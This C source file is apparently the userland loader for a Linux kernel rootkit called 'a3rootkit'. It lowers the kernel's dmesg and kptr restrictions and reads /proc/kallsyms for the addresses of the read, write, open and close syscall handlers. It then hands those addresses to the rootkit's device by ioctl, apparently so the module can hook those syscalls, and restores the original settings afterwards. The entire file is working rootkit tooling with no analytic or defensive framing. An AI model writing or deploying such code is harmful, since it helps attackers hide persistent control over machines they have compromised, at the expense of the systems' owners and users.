#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>

#define USER_KALLSYMS 0x114

int main(int argc, char **argv, char **envp)
{
    int dev_fd;
    FILE *kallsyms_file, *dmesg_restrict_file, *kptr_restrict_file;
    struct {
        size_t kaddr;
        char type;
        char name[0x100];
    } kinfo;
    size_t kern_seek_data[4];
    int orig_dmesg_restrict, orig_kptr_restrict;
    int syscall_count = 0;
    char dmesg_recover_cmd[0x100], kptr_recover_cmd[0x100];

    /* backup and change dmesg and kptr restrict */
    dmesg_restrict_file = fopen("/proc/sys/kernel/dmesg_restrict", "r");
    kptr_restrict_file = fopen("/proc/sys/kernel/kptr_restrict", "r");
    fscanf(dmesg_restrict_file, "%d", &orig_dmesg_restrict);
    fscanf(kptr_restrict_file, "%d", &orig_kptr_restrict);
    system("echo 0 > /proc/sys/kernel/dmesg_restrict");
    system("echo 0 > /proc/sys/kernel/kptr_restrict");

    /* read /proc/kallsyms */
    kallsyms_file = fopen("/proc/kallsyms", "r");

    while (syscall_count != 4) {
        fscanf(kallsyms_file, "%lx %c %100s", 
               &kinfo.kaddr, &kinfo.type, &kinfo.name);

        if (!strcmp("__x64_sys_read", kinfo.name)) {
            kern_seek_data[0] = kinfo.kaddr;
            syscall_count++;
        } else if (!strcmp("__x64_sys_write", kinfo.name)) {
            kern_seek_data[1] = kinfo.kaddr;
            syscall_count++;
        } else if (!strcmp("__x64_sys_open", kinfo.name)) {
            kern_seek_data[2] = kinfo.kaddr;
            syscall_count++;
        } else if (!strcmp("__x64_sys_close", kinfo.name)) {
            kern_seek_data[3] = kinfo.kaddr;
            syscall_count++;
        }
    }

    /* send data to kernel */
    dev_fd = open("/dev/a3rootkit", O_RDWR);
    printf("/dev/a3rootkit fd: %d\n", dev_fd);
    ioctl(dev_fd, USER_KALLSYMS, kern_seek_data);
    printf("send kern_seek_data success!");\

    /* recover dmesg and kptr restrict */
    snprintf(dmesg_recover_cmd, 0x100, 
            "echo %d > /proc/sys/kernel/dmesg_restrict", orig_dmesg_restrict);
    snprintf(kptr_recover_cmd, 0x100, 
            "echo %d > /proc/sys/kernel/kptr_restrict", orig_kptr_restrict);
    system(dmesg_recover_cmd);
    system(kptr_recover_cmd);

    return 0;
}
